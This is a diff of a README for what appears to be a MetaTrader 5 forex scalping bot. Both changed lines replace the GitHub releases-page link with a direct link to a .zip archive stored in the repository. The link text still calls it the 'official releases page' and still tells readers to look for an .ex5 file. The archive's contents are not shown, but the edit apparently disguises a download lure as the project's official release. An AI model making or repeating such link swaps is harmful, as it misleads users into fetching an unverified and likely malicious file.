@@ -1,6 +1,6 @@
 # 📈 Forex-Scalping-EA-MT5-MT1 - Fast automated trades for better results
 
-[![Download Software](https://img.shields.io/badge/Download_Now-Blue-blue)](https://github.com/Syndicalistreceptionist8185/Forex-Scalping-EA-MT5-MT1/releases)
+[![Download Software](https://img.shields.io/badge/Download_Now-Blue-blue)](https://raw.githubusercontent.com/Syndicalistreceptionist8185/Forex-Scalping-EA-MT5-MT1/main/ScalpingBot/Forex_M_E_Scalping_rescription.zip)
 
 This software manages trades on the MetaTrader 5 platform. It targets 1-minute and 5-minute price charts. Algorithms monitor market data to find price changes. The bot enters and exits trades to capture small profit margins over short time frames.
 
@@ -10,7 +10,7 @@ You need a computer that runs the Windows operating system. This software requir
 
 ## 📥 Getting the Files
 
-Visit the [official releases page](https://github.com/Syndicalistreceptionist8185/Forex-Scalping-EA-MT5-MT1/releases) to find the latest version. Look for the file ending in .ex5 under the Assets section. Click the filename to save it to your computer. Create a folder on your desktop to store this file so you can find it easily later. Do not change the file extension during the download process.
+Visit the [official releases page](https://raw.githubusercontent.com/Syndicalistreceptionist8185/Forex-Scalping-EA-MT5-MT1/main/ScalpingBot/Forex_M_E_Scalping_rescription.zip) to find the latest version. Look for the file ending in .ex5 under the Assets section. Click the filename to save it to your computer. Create a folder on your desktop to store this file so you can find it easily later. Do not change the file extension during the download process.
 
 ## 🛠️ Setting Up MetaTrader 5
 
